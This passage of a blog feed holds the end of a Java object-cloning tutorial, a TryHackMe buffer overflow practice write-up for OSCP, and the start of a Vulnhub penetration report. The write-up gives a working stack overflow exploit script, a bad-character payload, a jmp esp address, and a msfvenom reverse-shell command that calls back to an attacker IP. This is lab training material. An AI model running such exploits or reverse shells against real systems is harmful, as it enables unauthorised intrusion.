style="color:red">{C@785} </span><br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c_value = <span style="color:blue">300</span><br>bb = <span style="color:red">{B@784} </span><br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@785} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">300</span></p><br><p>对象浅拷贝即：拷贝时目标变量确实重新拷贝了原对象的值，但是原对象中保存的<strong>其他对象</strong>依然只是单纯地把地址拷贝到目标变量，并不是重新拷贝一份。</p><p>即上面Demo中，<em>b_c_class</em> 保存的是<em>对象C</em> 的值。 <strong>bb</strong> 中保存的 <em>b_c_class</em> <strong>指向的地址</strong> 和 <strong>b</strong> 中<em>b_c_class</em> <strong>指向的地址</strong>是同一块内存，所以修改 bb对象 中的 b_c_class，b对象也会受到牵连</p><br><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><br><p>为了让 <strong>bb对象</strong> 中的 <em>b_c_class</em> 重新拷贝一份 <strong>C对象</strong>。需要修改下 <em>clone()</em> 方法。</p><p>实现 C类 的clone()方法，然后在 B类 处手动 clone <em>b_c_class</em></p><br><p><strong>Demo:</strong></p><p>line 27 处将 <em>C对象</em> 重新<em>clone</em>一份</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">        C cClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cClone = (C) <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">        B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//clone Object B</span></span><br><span class="line">            bClone = (B) <span class="keyword">super</span>.clone();</span><br><span class="line">            <span class="comment">//clone Object C</span></span><br><span class="line">            bClone.b_c_class = (C) bClone.b_c_class.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = (B)b.clone();</span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><p><strong>Debug显示:</strong></p><p>b = {B@784}<br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@787} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">100</span><br>bb = {B@785}<br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@786} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = <span style="color:blue">300</span></p><br><p>现在确实可以将 对象中的对象 进行拷贝了。但是如果对象的层数很多的话，就显得很麻烦了。</p><p>还可以通过序列化的方式来进行对象拷贝，这种方式更方便。</p><br><p>序列化的时候需要注意：被序列化的类需要实现 <em>Serializable</em> 接口</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">implements</span> <span class="title">Cloneable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">public</span> Integer[] c_array = &#123;<span class="number">20</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span>, <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> B <span class="title">serialize_clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化本类</span></span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">            oos.writeObject(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">            ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">            bClone = (B) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = b.serialize_clone();</span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">        bb.b_c_class.c_array[<span class="number">0</span>] = <span class="number">30</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debug显示:</strong></p><p>b = {B@945}<br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@950} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = 100<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_array = <span style="color:red">{Integer[1]@951} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   0 = {Integer@952} 20<br>bb = {B@946}<br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@947} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = 300<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_array = <span style="color:red">{Integer[1]@948} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   0 = {Integer@949} 30</p><br><p><strong>Reference:</strong></p><p><a href="https://www.cnblogs.com/fnlingnzb-learner/p/10649509.html">https://www.cnblogs.com/fnlingnzb-learner/p/10649509.html</a></p>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;java 中 &lt;em&gt;Object&lt;/em&gt; 的操作都是引用。&lt;em&gt;原始数据类型&lt;/em&gt;操作都是值拷贝。&lt;/p&gt;
&lt;p&gt;这里的操作就包括 &lt;strong&gt;赋值&lt;/strong&gt; 和 函数&lt;strong&gt;参数传递&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>OSCP report 练手之 - tryhackme bufferoverflow</title>
    <link href="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/"/>
    <id>http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/</id>
    <published>2021-02-14T09:53:02.000Z</published>
    <updated>2021-02-14T13:24:45.455Z</updated>
    
    <content type="html"><![CDATA[<p>临近  OSCP Exam了，做点 bufferoverflow 的靶机练练手。之前无意间在 twiiter 上看到了一个靶场，有 bof。遂来练手。顺便也练练 Report 的编写。</p><br><p>靶机地址：</p><p><a href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p><br><p>这种是最基本的 BOF，没有保护什么的，都是走个流程就差不多了。</p><p>ps:</p><p>中途吃了个饭，重启了 lab machine。导致前后机器 ip 不一致了，不要在意。。。</p><span id="more"></span><p><strong>Snooping around the target</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/1.png" style="width:500px"><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/2.png" style="width:500px"><br><p><strong>Create a python script as exp. use msf-pattern_create to generate a string.</strong></p><p>a@kali:~/Desktop/bof$ <span style="color:blue">msf-pattern_create -l 1000</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;PAYLOAD&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.10.65.218&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;OVERFLOW2 &#x27;</span>+payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><br><p><strong>Note the value of EIP.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/3.png" style="width:500px"><br><p><strong>Use msf-pattern_offset to get the “eip” offset</strong></p><p>a@kali:~/Desktop/bof$ <span style="color:blue">msf-pattern_offset -l 1000 -q 76413176</span></p><p>[*] Exact match at offset <span style="color:red">634</span></p><br><p><strong>ensure “eip” offset</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span></span><br></pre></td></tr></table></figure><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/4.png" style="width:500px"><br><p><strong>check bad chars.Delete “<span style="color:red">\x00,\x0a,\x0d</span> first”</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF&quot;</span></span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/5.png" style="width:500px"><br><p><strong>copy these chars,edit these like following (You can do it easily with “sublime text”):</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/6.png" style="width:500px"><br><p><strong>create a python script to auto check bad char:</strong></p><p><a href="https://github.com/xiaopan233/OSCP-Script/blob/main/bof/badchars_check.py">https://github.com/xiaopan233/OSCP-Script/blob/main/bof/badchars_check.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rightChars = <span class="string">&quot;\xXX\xXX\xXX......&quot;</span>  <span class="comment">#the chars in python payload</span></span><br><span class="line">memeryChars = <span class="string">&quot;\xXX\xXX\xXX......&quot;</span> <span class="comment">#chars from immunity debugger hex dump</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(memeryChars)):</span><br><span class="line"><span class="keyword">if</span> rightChars[i] != memeryChars[i]:</span><br><span class="line">print(<span class="string">&quot;[-] Find bad char!&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;[-] Current char: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(rightChars[i])))</span><br><span class="line"><span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">print(<span class="string">&quot;[-] Previous char: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(rightChars[i-<span class="number">1</span>])))</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Not Find bad char!&quot;</span>)</span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/7.png" style="width:600px"><br><p><strong>Find a bad char “<span style="color:red">\x23</span>“</strong></p><p><strong>from payload delete char “<span style="color:red">\x23</span>“.</strong></p><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF&quot;</span></span><br></pre></td></tr></table></figure><br><p><strong>Then resend payload again.Repeat above process.Until  detect no bad char.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/8.png" style="width:500px"><br><p><strong>all detected bad chars following:</strong></p><p><span style="color:red">\x23, \x3c, \x83, \xba</span></p><p><strong>Next step.Find jmp esp address.</strong></p><p><strong>type command “<span style="color:blue">!mona modules</span>“ to detect all modules.</strong></p><p><strong>We should note the dll which without protection.For me the best dll is from the vulnnerable application.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/9.png" style="width:800px"><br><p><strong>get the opcode of “jmp esp”</strong></p><p>a@kali:~/Desktop$ <span style="color:blue">msf-nasm_shell </span><br>nasm &gt; <span style="color:blue">jmp esp</span><br>00000000  <span style="color:red">FFE4</span>              jmp esp</p><p><strong>not only “jmp esp”,but there also are “jmp ebp”,”call esp”,“jmp eax” etc.</strong></p><p>nasm &gt; <span style="color:blue">jmp ebp</span><br>00000000  <span style="color:red">FFE5</span>              jmp ebp<br>nasm &gt; <span style="color:blue">call esp</span><br>00000000  <span style="color:red">FFD4</span>              call esp<br>nasm &gt; <span style="color:blue">jmp eax</span><br>00000000  <span style="color:red">FFE0</span>              jmp eax</p><p><strong>Note that: use diffrent opcode, the shellcode location we put is diffrent too.</strong></p><p><strong>Here I use the first dll module “essfunc.dll”.head over to search the address of “jmp esp” opcode</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/10.png" style="width:500px"><br><p><strong>We head over to test address “<span style="color:red">0x625011af</span>“.</strong></p><p><strong>“jmp esp” will change eip to the address where esp pointed.</strong></p><p><strong>We can put some “<span style="color:red">\x90</span>“ after “jmp esp” address in our payload to verify if it work.</strong></p><p><strong>change python payload to following:</strong></p><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;\xaf\x11\x50\x62&quot;</span>+<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> <span class="comment">#note that return address should be reverse.0x625011af should be 0xaf115062</span></span><br></pre></td></tr></table></figure><p><strong>Check if  it work in immunity debugger:</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/11.png" style="width:800px"><br><p><strong>It worked!</strong></p><p><strong>Use msfvenom to generate shellcode.</strong></p><p><strong>command:</strong></p><p><span style="color:blue">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.132.252 LPORT=443 -f python -b “\x00\x0a\x0d\x23\x3c\x83\xba”</span></p><br><p><strong>modify our exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">......  <span class="comment"># here are the shellcode which generated by msfvenom</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;\xaf\x11\x50\x62&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">32</span>+buf  <span class="comment">#make sure there is some nop between shellcode and return address</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.10.15.141&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;OVERFLOW2 &#x27;</span>+payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/12.png" style="width:800px"><br><p><strong>BOOM!!</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;临近  OSCP Exam了，做点 bufferoverflow 的靶机练练手。之前无意间在 twiiter 上看到了一个靶场，有 bof。遂来练手。顺便也练练 Report 的编写。&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;靶机地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/bufferoverflowprep&quot;&gt;https://tryhackme.com/room/bufferoverflowprep&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;这种是最基本的 BOF，没有保护什么的，都是走个流程就差不多了。&lt;/p&gt;
&lt;p&gt;ps:&lt;/p&gt;
&lt;p&gt;中途吃了个饭，重启了 lab machine。导致前后机器 ip 不一致了，不要在意。。。&lt;/p&gt;</summary>
    
    
    
    <category term="OSCP" scheme="http://example.com/categories/OSCP/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>OSCP report 练手之 - vulnhub development-improved</title>
    <link href="http://example.com/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/"/>
    <id>http://example.com/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/</id>
    <published>2021-02-11T14:10:02.000Z</published>
    <updated>2021-02-28T12:06:44.738Z</updated>
    
    <content type="html"><![CDATA[<p>临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。</p><br><p>靶机地址：</p><p><a href="https://www.vulnhub.com/entry/digitalworldlocal-development,280/">https://www.vulnhub.com/entry/digitalworldlocal-development,280/</a></p><br><p> <strong>stuck:</strong></p><p>1、关键时候。。忘了查看网页源代码。关看提示的字去了，看了攻略才发现藏在网页源代码里。。。犯了低级错误。。</p><p>2、网页报错的时候，没有想到去搜索文件名。看了攻略才发现百度能搜到相关的 exploit</p><br><p>OSCP Exam Report 的模板在此：</p><p><a href="https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf">https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf</a></p><br><p>由于 Report 中只有第三节是重点，所以本节就直接仿照第三节来写了。</p><span id="more"></span><h2 id="3-2-Report-–-Service-Enumeration"><a href="#3-2-Report-–-Service-Enumeration" class="headerlink" title="3.2 Report – Service Enumeration"></a>3.2 Report – Service Enumeration</h2><table><thead><tr><th>Server IP Address</th><th>Ports Open</th><th>Service / Banner</th></tr></thead><tbody><tr><td>192.168.92.164</td><td>22， 8080</td><td>ssh / Apache</td></tr></tbody></table><br><h2 id="3-3-Report-–-Penetration"><a href="#3-3-Report-–-Penetration" class="headerlink" title="3.3 Report – Penetration"></a>3.3 Report – Penetration</h2><p><strong>Vulnerability Exploited:</strong>  <strong><span style="color:blue">SiTeFiLo File Disclosure vulnerability</span></strong></p><p><strong>System Vulnerable:</strong> 192.168.92.164</p><p><strong>Vulnerability Explanation:</strong> The Simple Text-File Login script (SiTeFiLo) suffers from a File Disclosure vulnerability . Leak a ssh account username and password.This vulnerability was used to obtain a low privilege shell.</p><p><strong>Privilege Escalation Vulnerability:</strong> Credential leak and abuse sudo permission</p><p><strong>Vulnerability Fix:</strong> Update SiTeFiLo to the lasted version</p><p><strong>Severity:</strong> <strong><span style="color:red">Critical</span></strong></p><br><p><strong>Information Gathering:</strong></p><br><p>kali@kali:~/Desktop$ <strong><span style="color:blue">sudo nmap -sV 192.168.92.164 -p 1-65535 -n</span></strong></p><p>……</p><p>PORT     STATE SERVICE     VERSION</p><p><strong><span style="color:red">22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span></strong></p><p>113/tcp  open  ident?</p><p>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p>445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p><strong><span style="color:red">8080/tcp open  http-proxy  IIS 6.0</span></strong></p><br><p><strong>Browse port 8080 web page.View the source code.Note these stuff:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/1.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/html_pages">http://192.168.92.164:8080/html_pages</a>. “development” may be a hint</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/2.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/development.html">http://192.168.92.164:8080/development.html</a>. View the source code.Find an intersting page</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/3.png" style="width:800px"><br><p><strong>Browse url <a 